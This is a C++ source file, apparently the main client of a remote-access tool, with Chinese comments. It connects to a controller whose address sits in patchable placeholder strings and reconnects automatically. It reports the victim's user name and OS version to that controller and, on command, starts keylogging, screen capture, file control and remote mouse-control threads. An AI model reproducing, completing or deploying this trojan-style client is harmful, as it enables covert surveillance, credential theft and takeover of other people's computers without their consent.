// RemotControlClient.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

//#include "pch.h"
#include <iostream>
#include "Screen.h"	//屏幕控制头
#include "File.h"	//文件操作头
#include "Socket.h"	//通信头
#include "KeyBoard.h"	//键盘记录头
#include "SystemInfo.h"		//获取系统信息头
using namespace std;

const int gOffsetDomain = 10;
const int gOffsetPort = 13;
const char gPort[100] = "PORTPORTPORT:1611 ";
char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";


struct Info
{
	char* host;
	int  port;
};

DWORD WINAPI fileThread(LPVOID pM)
{
	Info *myinfo = (Info*)pM;
	FileConTrol f(myinfo->host, myinfo->port);

	return 0;
}

DWORD WINAPI screenThread(LPVOID pM)
{
	Info *myinfo = (Info*)pM;
	Screen s(myinfo->host, myinfo->port);

	return 0;
}

DWORD WINAPI keyboardThread(LPVOID pM)
{
	Info *myinfo = (Info*)pM;
	KeyBoard *f = new KeyBoard(myinfo->host,myinfo->port);
	return 0;
}

DWORD WINAPI readMouse(LPVOID pM)
{
	Info *myinfo = (Info*)pM;

	Socket thread;
	int ret = thread.connectToHost(myinfo->host, myinfo->port);
	if (ret == 0)
	{
		//	break;
		return 0;
	}

	Sleep(2000);
	char Head[10] = "MOUSE&";
	thread.write(Head);

	char name[1024] = "OPEN_MOUSE";

	char buf[1024] = { 0 };
	string two = thread.read(buf);

	if (name != two)		//返回是否为OPEN_FILE
	{
		return 0;
	}

	while (1)
	{
		char buf[100];
		thread.read(buf, 100);

		vector<string> list;

		char *tok = strtok(buf, "#");
		while (tok)
		{
			list.push_back(tok);
			tok = strtok(NULL, "#");
		}

		int ListSize = list.size();
		if (list.size() == 0)
		{
			return 0;
		}

		string head = list.at(0);
		if (head == "press")
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		}
		if (head == "release")
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		if (head == "move")
		{
			if (list.size() < 3)
			{
				return 0;
			}
			char xs[4];
			char ys[4];
			int x = atoi(list.at(1).data());
			int y = atoi(list.at(2).data());
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, x, y, 0, 0);
		}
	}
	return 0;
}


int main()
{

	Socket s;
	while (1) 
	{

		
		// 如果断开了，隔一秒自动连接
		char domain[200] = { 0 };
		char *domainStartPos = (char*)gDomain + gOffsetDomain;
		char *domainStopPos = strchr(domainStartPos, ' ');
		memcpy(domain, domainStartPos, domainStopPos - domainStartPos);
		int port = atoi(gPort + gOffsetPort);
		cout << "ip:" << domain;
		int ret = -1;
		while (ret == -1)
		{
			 ret = s.connectToHost(domain, port);
			 cout << "ret:" << ret;

		}
		s.isConnected = true;

		Sleep(1000);
		char name[1024] = "chunsource";
		s.write(name);

		char buf[1024] = { 0 };
		string two = s.read(buf);
		int cmpNumber = strcmp(name,buf);

		if (name == two)		//第一次交互判断是否为协议主机
		{
			string name = SystemInfo::GetSystemUserName();
			string verson = SystemInfo::GetSystemVerson();

			string result = name + "#" + verson+"&";

			const char* aa = result.data();
			char* bb = const_cast<char*>(aa);

			s.write(bb);

			while (1)
			{
				string temp = s.read(buf);
				if (s.isConnected == false)
				{
					cout << "\n  Main isConnect == false";
					break;
				}
				if (temp == "FILE")
				{
					Info myinfo;
					myinfo.host = domain;
					myinfo.port = port;
					HANDLE h;
					CreateThread(NULL, 0, fileThread, &myinfo, 0, NULL);
				}
				if (temp == "SCREEN")
				{
					Info myinfo;
					myinfo.host = domain;
					myinfo.port = port;
					
					CreateThread(NULL, 0, screenThread, &myinfo, 0, NULL);
					HANDLE h = CreateThread(NULL, 0, readMouse, &myinfo, 0, NULL);

				}
				if (temp == "KEYBOARD")
				{
					Info myinfo;
					myinfo.host = domain;
					myinfo.port = port;

					CreateThread(NULL, 0, keyboardThread, &myinfo, 0, NULL);
				}
				if (temp == "")
				{
					break;
				}
				Sleep(2000);
			}
		}
		
	}
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门提示: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
